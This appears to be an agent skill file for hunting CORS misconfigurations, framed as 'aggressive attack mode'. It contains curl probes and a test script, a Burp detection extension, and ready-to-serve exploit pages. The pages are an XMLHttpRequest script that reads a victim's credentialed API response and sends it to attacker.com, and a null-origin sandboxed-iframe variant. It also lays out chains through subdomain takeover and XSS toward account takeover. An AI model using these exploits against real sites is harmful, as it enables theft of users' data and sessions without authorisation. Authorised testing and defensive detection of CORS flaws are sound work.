---
name: hunt-cors
description: CORS misconfiguration hunting — Origin reflection, null origin, pre-flight abuse, wildcard detection, trust exploitation. Generates ready-to-run payloads, curl one-liners, and Burp extension scripts. Escalates to session hijacking, data exfiltration, and account takeover.
---

# CORS MISCONFIGURATION HUNTING — AGGRESSIVE ATTACK MODE

**CORS bugs chain to full account takeover with one reflected Origin.**

## Quick Start

```bash
# Basic Origin reflection test
TARGET="https://example.com/api/userinfo"
curl -s -H "Origin: https://evil.com" -I "$TARGET" | grep -i "access-control"

# Test with credentials
curl -s -H "Origin: https://evil.com" -b "session=token" -I "$TARGET" | grep -i "access-control"

# Null origin test
curl -s -H "Origin: null" -I "$TARGET" | grep -i "access-control"
```

## Detection Methodology

### 1. Automated Origin Injection

```bash
#!/bin/bash
# cors-test.sh — Test multiple Origin values against a target
TARGET="$1"
ORIGINS=(
  "https://evil.com"
  "https://attacker.com"
  "null"
  "data:"
  "https://$(echo $TARGET | sed 's|https\?://||' | cut -d'/' -f1)"
  "https://evil.$(echo $TARGET | sed 's|https\?://||' | cut -d'/' -f1 | cut -d'.' -f2).com"
  "https://$(echo $TARGET | sed 's|https\?://||' | cut -d'/' -f1 | cut -d'.' -f1).com.evil.com"
)

for ORIGIN in "${ORIGINS[@]}"; do
  echo "[*] Testing Origin: $ORIGIN"
  RESPONSE=$(curl -s -I -H "Origin: $ORIGIN" "$TARGET" 2>/dev/null)
  ACAO=$(echo "$RESPONSE" | grep -i "access-control-allow-origin" | head -1)
  ACAC=$(echo "$RESPONSE" | grep -i "access-control-allow-credentials" | head -1)
  if [ -n "$ACAO" ]; then
    echo "  [!] ACAO: $ACAO"
    echo "  [!] ACAC: $ACAC"
    echo "  [!] VULNERABLE if ACAO reflects origin + ACAC: true"
  fi
done
```

### 2. Response Header Analysis

```bash
# Full response header dump for CORS analysis
curl -s -D- -H "Origin: https://evil.com" -b "session=token" "$TARGET" | head -50

# Key headers to check:
# Access-Control-Allow-Origin
# Access-Control-Allow-Credentials
# Access-Control-Allow-Methods
# Access-Control-Allow-Headers
# Access-Control-Expose-Headers
# Vary: Origin  (if missing, response may be cacheable)
```

## Attack Patterns

### Origin Reflection (Critical)

The server reflects any Origin in `Access-Control-Allow-Origin` without validation.

```bash
# Test: does the server reflect arbitrary Origins?
curl -s -D- -H "Origin: https://totally-evil-website.com" "$TARGET" | grep "Access-Control-Allow-Origin"
# BAD: Access-Control-Allow-Origin: https://totally-evil-website.com
# GOOD: (header absent or static value)
```

**Exploit script — steal user data:**

```html
<!-- Save as cors-exploit.html, serve from attacker.com -->
<script>
var req = new XMLHttpRequest();
req.open("GET", "https://target.com/api/userinfo", true);
req.withCredentials = true;
req.onreadystatechange = function() {
  if (req.readyState == 4 && req.status == 200) {
    // Exfiltrate response
    fetch("https://attacker.com/log?data=" + encodeURIComponent(req.responseText));
  }
};
req.send();
</script>
```

### Null Origin Exploitation

Browsers send `Origin: null` when loading content from `data:` URIs or sandboxed iframes.

```bash
# Test null origin acceptance
curl -s -D- -H "Origin: null" "$TARGET" | grep "Access-Control-Allow-Origin"
```

**Exploit — sandboxed iframe:**

```html
<!-- attacker.com/null-exploit.html -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
          var req = new XMLHttpRequest();
          req.open('GET','https://target.com/api/data',true);
          req.withCredentials=true;
          req.onload=function(){
            parent.postMessage(req.responseText,'*');
          };
          req.send();
        </script>"></iframe>
```

### Pre-flight Abuse

The `OPTIONS` pre-flight request is used to verify allowed Origins for credentialed requests.

```bash
# Send OPTIONS pre-flight with evil Origin
curl -s -D- -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  "$TARGET"

# Check if pre-flight allows credentials + evil origin
# BAD: Access-Control-Allow-Origin: https://evil.com
#      Access-Control-Allow-Credentials: true
```

### Subdomain XSS → CORS Escalation Chain

1. Find XSS on any subdomain (e.g., `sub.target.com`)
2. Use XSS to read data from `target.com` via CORS (if `*.target.com` is trusted)

```bash
# Step 1: Confirm CORS trusts subdomains
curl -s -D- -H "Origin: https://evil.target.com" "$TARGET" | grep "Access-Control-Allow-Origin"

# Step 2: If subdomain XSS exists, chain it
# XSS on sub.target.com → reads api.target.com → exfiltrates to attacker.com
```

### Wildcard (*) with Credentials Detection

```bash
# Wildcard + credentials = browser rejects, but worth noting
curl -s -D- -H "Origin: https://evil.com" "$TARGET" | grep -i "access-control"
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# Browser blocks this, but server misconfiguration is a finding
```

### Trust Relationship Exploitation

```bash
# If server trusts *.example.com:
curl -s -D- -H "Origin: https://evil.example.com" "$TARGET" | grep "Access-Control-Allow-Origin"

# If server trusts any subdomain and you control a subdomain:
curl -s -D- -H "Origin: https://attacker-controlled.subdomain.example.com" "$TARGET"

# Subdomain takeover check
dig +short CNAME subdomain.example.com  # Check for dangling CNAME
```

### HTTP → HTTPS Downgrade Attack

```bash
# Some servers only validate Origin on HTTPS, not HTTP
curl -s -D- -H "Origin: http://evil.com" "http://target.com/api/data" | grep "Access-Control"

# Or reverse: Origin header not checked on HTTP endpoints
curl -s -D- -H "Origin: http://evil.com" "https://target.com/api/data" | grep "Access-Control"
```

## Burp Extension Scripts

### Python — Auto-test CORS

```python
# Save as cors_checker.py, load in Burp as extension
from burp import IBurpExtender, IScannerCheck
import re

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.registerScannerCheck(self)

    def doPassiveScan(self, baseRequestResponse):
        response = baseRequestResponse.getResponse()
        headers = self._helpers.analyzeResponse(response).getHeaders()
        acao = acac = None
        for h in headers:
            lower = h.lower()
            if lower.startswith("access-control-allow-origin:"):
                acao = h.split(":", 1)[1].strip()
            if lower.startswith("access-control-allow-credentials:"):
                acac = h.split(":", 1)[1].strip()
        if acao and acao != "null":
            if acao.startswith("http://") or acao.startswith("https://"):
                issues = []
                desc = "CORS Origin reflection: ACAO=%s, ACAC=%s" % (acao, acac)
                issues.append(self._callbacks.createIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    "CORS Misconfiguration", desc, "High", "Certain"))
                return issues
        return None
```

## Checklist

- [ ] Test Origin reflection with `https://evil.com`
- [ ] Test `null` origin acceptance
- [ ] Test pre-flight `OPTIONS` with evil Origin + credentials header
- [ ] Check for wildcard `*` with `Access-Control-Allow-Credentials: true`
- [ ] Test subdomain trust (`*.target.com`)
- [ ] Check for HTTP vs HTTPS Origin validation differences
- [ ] Test URL parser differentials (e.g., `https://evil.com%0a`)
- [ ] Verify `Vary: Origin` header is present (cache poisoning risk if absent)
- [ ] Test `Access-Control-Allow-Headers` with `Authorization`
- [ ] Chain with subdomain takeover or XSS for full impact

## Tools

- **curl** — Manual Origin injection testing
- **Burp Suite** — Intruder with Origin payloads, Scanner
- **CORScanner** — `python cors.py -u TARGET -v`
- **OWASP ZAP** — Active scan plugin for CORS
- **custom Burp extension** — See Python script above

## Escalation Paths

| Finding | Impact | Severity |
|---------|--------|----------|
| Origin reflection + credentials | Account takeover, data theft | Critical |
| Null origin + credentials | Data theft via sandboxed iframe | High |
| Subdomain trust + XSS | Full account takeover chain | Critical |
| Wildcard + credentials | Browser blocks, but misconfiguration | Medium |
| No Vary: Origin | Cache poisoning | Medium |
| Pre-flight allows dangerous headers | Auth header theft | High |
